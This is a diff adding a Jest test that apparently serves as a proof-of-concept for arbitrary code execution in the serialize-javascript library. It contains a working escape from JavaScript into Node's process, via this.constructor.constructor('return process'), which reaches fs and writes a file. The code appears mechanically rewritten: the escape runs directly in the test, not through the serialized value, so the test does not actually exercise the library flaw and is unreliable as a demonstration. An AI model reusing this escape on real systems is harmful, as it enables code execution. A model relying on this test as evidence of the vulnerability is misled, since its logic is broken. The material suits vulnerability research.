@@ -1,0 +1,38 @@
+const v49 = () => {
+    const v26 = expect.assertions(2);
+    v26;
+    const fs = require('fs');
+    const serialize = require('serialize-javascript');
+    const path = './serialize-javascript';
+    file_exist = fs.existsSync(path);
+    const v27 = expect(file_exist);
+    const v28 = v27.toBe(false);
+    v28;
+    const v29 = this.constructor;
+    const v30 = `return process`;
+    const v31 = v29.constructor(v30);
+    const v32 = v31();
+    const v33 = v32.mainModule;
+    const v34 = `fs`;
+    const v35 = v33.require(v34);
+    const v36 = `serialize-javascript`;
+    const v37 = ``;
+    const v38 = v35.writeFileSync(v36, v37);
+    const v39 = 'string' + v38;
+    const v40 = { str: v39 };
+    const v41 = serialize(v40);
+    const v42 = '(' + v41;
+    const v43 = v42 + ')';
+    const v44 = eval(v43);
+    v44;
+    file_exist = fs.existsSync(path);
+    const v45 = expect(file_exist);
+    const v46 = v45.toBe(true);
+    v46;
+    const v47 = function (err) {
+    };
+    const v48 = fs.unlink(path, v47);
+    v48;
+};
+const v50 = test('Arbitrary code execution in serialize-javascript', v49);
+v50;
